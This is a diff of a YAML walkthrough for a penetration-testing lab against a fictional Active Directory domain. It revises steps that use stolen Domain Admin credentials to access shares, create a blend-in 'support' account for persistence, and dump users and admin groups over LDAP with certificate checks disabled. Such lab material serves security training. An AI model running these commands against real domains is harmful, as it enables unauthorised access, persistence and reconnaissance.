@@ -674,16 +674,14 @@ walkthrough:
             smbclient //172.16.2.12/netlogon -U 'Administrator%Adm1n2024' -c 'ls'
             ```
 
-            ### Cross-Domain Access
+            ### What This Proves
 
-            Domain Admin credentials work on ALL domain-joined systems:
+            Successfully accessing SYSVOL and NETLOGON confirms:
+            - Your credentials are valid Domain Admin
+            - You can read/write domain-wide configuration
+            - You have the highest level of access in the domain
 
-            ```bash
-            # Access sensitive share on file server using Domain Admin
-            smbclient //172.16.2.10/sensitive -U 'Administrator%Adm1n2024' -c 'ls'
-            ```
-
-            > **Notice:** You accessed the file server with Domain Admin credentials, not svc_backup. This demonstrates domain-wide access.
+            > **Note:** The file server in this lab uses local authentication, not domain authentication. In a real Windows environment, Domain Admin would grant access to all domain-joined systems.
 
         - id: step4_5
           vm: kali
@@ -693,17 +691,15 @@ walkthrough:
 
             A common post-exploitation technique is creating a hidden admin account for persistent access.
 
-            ### Create a New Domain User
+            ### Create a New Domain User with Password
+
+            The `net rpc` command creates users with a password in one step:
 
             ```bash
-            rpcclient -U 'Administrator%Adm1n2024' 172.16.2.12 -c 'createdomuser support'
+            net rpc user add support 'P@ssw0rd123!' -U 'Administrator%Adm1n2024' -S 172.16.2.12
             ```
 
-            ### Set the Password
-
-            ```bash
-            rpcclient -U 'Administrator%Adm1n2024' 172.16.2.12 -c 'setuserinfo2 support 24 P@ssw0rd123!'
-            ```
+            **Expected output:** `Added user 'support'.`
 
             ### Verify the Account Exists
 
@@ -717,7 +713,9 @@ walkthrough:
             smbclient -L //172.16.2.12 -U 'support%P@ssw0rd123!'
             ```
 
-            > **In real environments:** Attackers create accounts like "support", "svc_scanner", or "admin2" that blend in. Blue teams should monitor for unexpected account creation.
+            You should see the share listing, confirming the account works!
+
+            > **Attacker tradecraft:** Accounts named "support", "svc_scanner", or "helpdesk" blend in with legitimate accounts. Blue teams should alert on any new account creation.
 
             ### Why This Matters
 
@@ -740,10 +738,12 @@ walkthrough:
 
             LDAP provides more detailed information than RPC. Let's extract everything.
 
+            > **Note:** Samba AD requires encrypted LDAP connections. We use `-ZZ` for StartTLS and `LDAPTLS_REQCERT=never` to accept self-signed certificates.
+
             ### List All Users with Details
 
             ```bash
-            ldapsearch -x -H ldap://172.16.2.12 \
+            LDAPTLS_REQCERT=never ldapsearch -x -H ldap://172.16.2.12 -ZZ \
               -D "cn=Administrator,cn=Users,DC=acmewidgets,DC=local" \
               -w 'Adm1n2024' \
               -b 'cn=Users,DC=acmewidgets,DC=local' \
@@ -755,7 +755,7 @@ walkthrough:
             Service accounts often have elevated privileges and weak passwords:
 
             ```bash
-            ldapsearch -x -H ldap://172.16.2.12 \
+            LDAPTLS_REQCERT=never ldapsearch -x -H ldap://172.16.2.12 -ZZ \
               -D "cn=Administrator,cn=Users,DC=acmewidgets,DC=local" \
               -w 'Adm1n2024' \
               -b 'DC=acmewidgets,DC=local' \
@@ -765,7 +765,7 @@ walkthrough:
             ### Export Domain Admin Members
 
             ```bash
-            ldapsearch -x -H ldap://172.16.2.12 \
+            LDAPTLS_REQCERT=never ldapsearch -x -H ldap://172.16.2.12 -ZZ \
               -D "cn=Administrator,cn=Users,DC=acmewidgets,DC=local" \
               -w 'Adm1n2024' \
               -b 'DC=acmewidgets,DC=local' \
